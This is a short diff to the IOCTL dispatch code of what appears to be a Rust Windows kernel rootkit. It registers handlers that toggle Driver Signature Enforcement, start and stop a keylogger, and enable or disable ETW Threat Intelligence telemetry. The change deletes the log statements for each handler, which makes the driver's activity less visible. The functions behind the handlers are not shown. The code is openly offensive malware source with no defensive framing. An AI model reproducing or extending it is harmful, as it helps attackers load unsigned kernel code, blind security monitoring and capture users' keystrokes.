@@ -21,7 +21,6 @@ use {
 pub fn get_misc_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
     // Responsible for enabling/disabling DSE.
     ioctls.insert(IOCTL_ENABLE_DSE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
-        log::info!("Received IOCTL_ENABLE_DSE");
         let status = unsafe { handle!(stack, Dse::set_dse_state, DSE) };
         unsafe { (*irp).IoStatus.Information = 0 };
         
@@ -33,7 +32,6 @@ pub fn get_misc_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
 
     // Start / Stop Keylogger
     ioctls.insert(IOCTL_KEYLOGGER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
-        log::info!("Received IOCTL_KEYLOGGER");
         let status = unsafe { handle!(stack, set_keylogger_state, Keylogger) };
         unsafe { (*irp).IoStatus.Information = 0 };
 
@@ -42,7 +40,6 @@ pub fn get_misc_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
 
     // Responsible for enabling/disabling ETWTI.
     ioctls.insert(IOCTL_ETWTI, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
-        log::info!("Received IOCTL_ETWTI");
         let status = unsafe { handle!(stack, Etw::etwti_enable_disable, ETWTI) };
         unsafe { (*irp).IoStatus.Information = 0 };
 
